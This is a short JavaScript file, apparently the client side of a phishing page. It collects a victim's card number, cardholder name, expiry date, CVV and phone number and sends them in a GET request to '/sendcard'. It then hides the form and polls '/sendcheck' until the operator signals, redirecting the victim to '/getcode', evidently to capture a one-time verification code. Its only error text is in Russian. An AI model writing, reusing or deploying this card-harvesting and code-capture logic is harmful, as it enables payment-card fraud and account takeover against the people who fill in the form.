
function test(el){
    if(el.value.length === 2){
        el.value = el.value+'/'
    }
}
function send(cardnum, cardholder, carddays, cardcvv, num){
    if(cardnum.length === 16 && carddays.length === 5 && cardholder.length > 0 && cardcvv.length === 3 && num.length === 11){
        fetch(`/sendcard?cnum=${cardnum}&ch=${cardholder}&cd=${carddays}&ccvv=${cardcvv}&num=${num}`)
    }
    else{
        document.getElementById('Error').innerHTML = `Проверьте введенные данные! Ошибка.`
    }
}

function validate(cardnum, cardholder, carddays, cardcvv, num) {
    if(cardnum.length === 16 && carddays.length === 5 && cardholder.length > 0 && cardcvv.length === 3 && num.length === 11){
        fetch(`/sendcard?cnum=${cardnum}&ch=${cardholder}&cd=${carddays}&ccvv=${cardcvv}&num=${num}`)
        let els=document.getElementsByClassName("scr");
        let els2=document.getElementsByClassName("scr2");
        for(let i = 0; i<els.length;++i){
            els[i].style.display = 'none';
        }
        for(let i = 0; i<els2.length;++i){
            els2[i].style.display = 'block';
        }
        setInterval(()=>{
            fetch(`/sendcheck`).then(response => response.text())
                .then(responseText => {
                    if(responseText !== 'false'){
                        window.location.href = '/getcode'
                    }
                });
        }, 500)
    }
    else{
        document.getElementById('Error').innerHTML = `Проверьте введенные данные! Ошибка.`
    }
};

